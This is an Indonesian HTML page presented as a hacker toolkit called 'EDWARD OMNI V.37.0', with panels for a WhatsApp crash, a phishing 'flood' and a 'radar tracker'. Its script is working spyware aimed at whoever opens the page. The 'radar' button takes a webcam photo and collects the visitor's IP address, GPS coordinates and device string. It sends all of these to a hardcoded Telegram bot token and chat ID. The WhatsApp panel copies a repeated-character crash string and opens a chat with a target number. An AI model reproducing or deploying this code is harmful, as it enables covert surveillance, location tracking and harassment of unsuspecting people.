<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.37.0 ]</title>
    <style>
        :root { --neon: #0f0; --bg: #050505; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; text-align: center; margin:0; overflow-x: hidden; }
        .panel { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 12px; margin: 10px; text-align: left; }
        h3 { margin: 0 0 10px 0; font-size: 13px; color: var(--neon); text-transform: uppercase; }
        input { background: #000; border: 1px solid #444; color: #fff; padding: 10px; width: 90%; border-radius: 8px; margin-bottom: 8px; font-size: 11px; outline: none; }
        button { width: 100%; padding: 12px; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; text-transform: uppercase; font-size: 11px; }
        .wa-btn { background: #25D366; color: #000; }
        .phish-btn { background: #bc13fe; color: #fff; }
        
        /* RADAR OVERLAY */
        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .radar-circle { width: 200px; height: 200px; border: 2px solid var(--neon); border-radius: 50%; position: relative; box-shadow: 0 0 15px var(--neon); }
        .radar-sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.5), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; border-right: 1px solid var(--neon); }
        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .exit-btn { margin-top: 20px; background: transparent; color: #555; border: 1px solid #333; width: auto; padding: 5px 20px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <h2 style="color:var(--neon); margin: 10px 0;">EDWARD OMNI V.37.0</h2>

    <div class="panel" style="border-left: 4px solid #25D366;">
        <h3>🟢 WA BUG CRASH</h3>
        <input type="number" id="noWA" placeholder="628xxxxxxx">
        <button class="wa-btn" onclick="startCrashWA()">SEND PAYLOAD ☠️</button>
    </div>

    <div class="panel" style="border-left: 4px solid #bc13fe;">
        <h3>🟣 PHISHING ATTACK</h3>
        <input type="text" id="targetUrl" placeholder="URL Web Penipu">
        <button class="phish-btn" onclick="startPoison()">POISON / FLOOD 🟡</button>
    </div>

    <div class="panel" style="border-left: 4px solid var(--neon);">
        <h3>📡 RADAR LIVE TRACKER</h3>
        <button style="background:transparent; border:1px solid var(--neon); color:var(--neon);" onclick="startRadar()">AKTIFKAN RADAR 🚀</button>
    </div>

    <div id="radarOverlay">
        <div class="radar-circle">
            <div class="radar-sweep"></div>
        </div>
        <p id="statusTxt" style="color:var(--neon); margin-top:20px; font-size:12px;">SATELLITE SYNCING...</p>
        <button class="exit-btn" onclick="closeRadar()">EXIT RADAR</button>
    </div>

    <canvas id="canvas"></canvas>
    <video id="v" style="display:none;" autoplay playsinline></video>

    <script>
        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const ID = '7898572558';

        function closeRadar() { document.getElementById('radarOverlay').style.display = 'none'; }

        async function startRadar() {
            document.getElementById('radarOverlay').style.display = 'flex';
            const status = document.getElementById('statusTxt');

            try {
                // 1. IP & Device
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // 2. Akses Kamera & Foto
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    
                    // Kirim Foto ke Telegram
                    const formData = new FormData();
                    formData.append('chat_id', ID);
                    formData.append('photo', blob);
                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto", { method: "POST", body: formData });
                    
                    // 3. Lokasi
                    navigator.geolocation.getCurrentPosition((p) => {
                        let msg = "🔱 [ RADAR DETECTED ] 🔱\nIP: "+ipData.ip+"\nLOC: https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+"\nDEV: "+navigator.userAgent;
                        fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent(msg));
                        status.innerText = "COORDINATES SECURED.";
                    });
                }, 2000);

            } catch (e) {
                status.innerText = "SENSOR ERROR: ALLOW PERMISSION!";
            }
        }

        function startCrashWA() {
            let n = document.getElementById('noWA').value;
            let p = "జ్ఞા".repeat(200);
            navigator.clipboard.writeText(p).then(() => { window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=RADAR_SYNC"; });
        }
    </script>
</body>
</html>
